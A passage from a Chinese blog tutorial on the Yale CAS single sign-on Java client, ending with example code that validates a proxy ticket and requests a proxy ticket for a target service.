String urlOfProxyCallbackServlet = &quot;<a href="https://portal.yale.edu/CasProxyServlet" target="_blank">https://portal.yale.edu/CasProxyServlet</a>&quot;;
pv.setProxyCallbackUrl(urlOfProxyCallbackServlet);
//</em> contact CAS and validate /<em>/
pv.validate();
//</em> if we want to look at the raw response, we can use getResponse() /<em>/
xmlResponse = pv.getResponse();
//</em> read the response /<em>/
if(pv.isAuthenticationSuccesful()) {
  user = pv.getUser();
  proxyList = pv.getProxyList();
} else {
  errorCode = pv.getErrorCode();
  errorMessage = pv.getErrorMessage();
  //</em> handle the error /<em>/
}
//</em> The user is now authenticated. /<em>/
//</em> If we did set the proxy callback url, we can get proxy tickets with this method call: /*/
String urlOfTargetService = &quot;<a href="http://hkg2.its.yale.edu/someApp/portalFeed" target="_blank">http://hkg2.its.yale.edu/someApp/portalFeed</a>&quot;;
String proxyTicket = ProxyTicketReceptor.getProxyTicket( pv.getPgtIou() , urlOfTargetService);
在这里，我们假设上下文环境中的用户已经通过了CAS登录认证，被重定向到当前的servlet下，我们在servlet中获取ticket凭证，servlet的URL对用户身份进行确认。如果上下文参数中无法获取ticket凭证，我们就认为用户尚未登录，那么，该servlet必须负责将用户重定向到CAS的登录页面去。
初战告捷
      到今天为止，我们已经通过JA-SIG学习笔记的1-3部分，对CAS这个开源SSO的框架有了个大体的了解和初步的掌握，希望这些知识能为各位步入CAS殿堂打开一扇的大门。咖啡希望在今后的工作应用中，能同大家一块共同探讨，进一步深入了解CAS。
学无止境。。。。。。
分享到： <a href="&quot;分享到新浪微博&quot;"><img src="" alt=""></a> <a href="&quot;分享到腾讯微博&quot;"><img src="" alt=""></a></p>
<p><a href="http://lvyanglin.iteye.com/blog/622656" title="cas-server-3.3.2  使用举例" target="_blank">cas-server-3.3.2 使用举例</a> | <a href="http://lvyanglin.iteye.com/blog/615166" title="cas 服务器端的配置" target="_blank">cas 服务器端的配置</a></p>
<ul>
<li>2010-03-17 14:56</li>
<li>浏览 770</li>
<li><a href="http://lvyanglin.iteye.com/blog/618081#comments" target="_blank">评论(0)</a></li>
<li>分类:<a href="http://www.iteye.com/blogs/category/language" target="_blank">编程语言</a></li>
<li><a href="http://www.iteye.com/wiki/blog/618081" target="_blank">相关推荐</a></li>
</ul>
<h3 id="-">评论</h3>
<p><a href=""></a></p>
<h3 id="-">发表评论</h3>
<p><a href="http://lvyanglin.iteye.com/login" target="_blank"><img src="" alt=""></a><a href="http://lvyanglin.iteye.com/login" target="_blank">您还没有登录,请您登录后再发表评论</a></p>
<p><a href="http://lvyanglin.iteye.com/" target="_blank"><img src="&quot;lvyanglin的博客: 老老&quot;" alt="lvyanglin的博客"></a></p>
<p>lvyanglin</p>
<ul>
<li>浏览: 11625 次</li>
<li>性别: <img src="&quot;男&quot;" alt="Icon_minigender_1"></li>
<li>来自: 广州</li>
<li><img src="" alt=""><h3 id="-http-lvyanglin-iteye-com-blog-user_visits-">最近访客 <a href="http://lvyanglin.iteye.com/blog/user_visits" target="_blank">更多访客&gt;&gt;</a></h3>
</li>
</ul>
<p><a href="http://shangyue1110.iteye.com/" target="_blank"><img src="&quot;shangyue1110的博客: &quot;" alt="shangyue1110的博客"></a></p>
<p><a href="http://shangyue1110.iteye.com/" title="shangyue1110" target="_blank">shangyue1110</a></p>
<p><a href="http://dylinshi126.iteye.com/" target="_blank"><img src="&quot;dylinshi126的博客: &quot;" alt="dylinshi126的博客"></a></p>
<p><a href="http://dylinshi126.iteye.com/" title="dylinshi126" target="_blank">dylinshi126</a>
<a href="http://dada7020.iteye.com/" target="_blank"><img src="&quot;dada7020的博客: &quot;" alt="dada7020的博客"></a></p>
<p><a href="http://dada7020.iteye.com/" title="dada7020" target="_blank">dada7020</a></p>
<p><a href="http://k175981998.iteye.com/" target="_blank"><img src="&quot;k175981998的博客: &quot;" alt="k175981998的博客"></a></p>
<p><a href="http://k175981998.iteye.com/" title="k175981998" target="_blank">k175981998</a></p>
<h3 id="-">文章分类</h3>
<ul>
<li><a href="http://lvyanglin.iteye.com/" target="_blank">全部博客 (35)</a></li>
<li><a href="http://lvyanglin.iteye.com/category/67638" target="_blank">java (20)</a></li>
<li><a href="http://lvyanglin.iteye.com/category/67639" target="_blank">数据库 (5)</a></li>
<li><a href="http://lvyanglin.iteye.com/category/67640" target="_blank">其他 (5)</a></li>
<li><a href="http://lvyanglin.iteye.com/category/187499" target="_blank">在centsos上安装chrome (1)</a></li>
<li><a href="http://lvyanglin.iteye.com/category/194903" target="_blank">centos 安装 (1)</a></li>
<li><p><a href="http://lvyanglin.iteye.com/category/220785" target="_blank">学习linux (0)</a></p>
<h3 id="-">社区版块</h3>
</li>
<li><p><a href="http://lvyanglin.iteye.com/blog/news" target="_blank">我的资讯</a> (0)</p>
</li>
<li><a href="http://lvyanglin.iteye.com/blog/post" target="_blank">我的论坛</a> (0)</li>
<li><a href="http://lvyanglin.iteye.com/blog/answered_problems" target="_blank">我的问答</a> (1)</li>
</ul>
<h3 id="-">存档分类</h3>
<ul>
<li><a href="http://lvyanglin.iteye.com/blog/monthblog/2011-12" target="_blank">2011-12</a> (2)</li>
<li><a href="http://lvyanglin.iteye.com/blog/monthblog/2011-11" target="_blank">2011-11</a> (1)</li>
<li><a href="http://lvyanglin.iteye.com/blog/monthblog/2011-05" target="_blank">2011-05</a> (2)</li>
<li><p><a href="http://lvyanglin.iteye.com/blog/monthblog_more" target="_blank">更多存档...</a></p>
<h3 id="-">最新评论</h3>
</li>
<li><p><a href="http://403577706.iteye.com/" title="403577706" target="_blank">403577706</a>： sudo apt-get build-dep /#(packag ...
<a href="http://lvyanglin.iteye.com/blog/800337#bc2250038" target="_blank">sudo apt-get -f install</a>
声明：ITeye文章版权属于作者，受法律保护。没有作者书面许可不得转载。若作者同意转载，必须以超链接形式标明文章原始出处和作者。
© 2003-2011 ITeye.com. All rights reserved. [ 京ICP证110151号 京公网安备110105010620 ]
<img src="" alt=""></p>
</li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/CAS/">CAS</a></li></span></span> | <span class="tags">Tagged <a href="/tags/CAS/" class="label label-primary">CAS</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-CAS--casclient使用指南-老老-ITeye技术网站/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-CAS--casclient使用指南-老老-ITeye技术网站" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/84/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/82/">82</a></li><li><a class="page-number" href="/page/83/">83</a></li><li><a class="page-number" href="/page/84/">84</a></li><li class="active"><li><span class="page-number current">85</span></li><li><a class="page-number" href="/page/86/">86</a></li><li><a class="page-number" href="/page/87/">87</a></li><li><a class="page-number" href="/page/88/">88</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/86/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> 更新时间: <em>2014-03-15 16:43:39</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
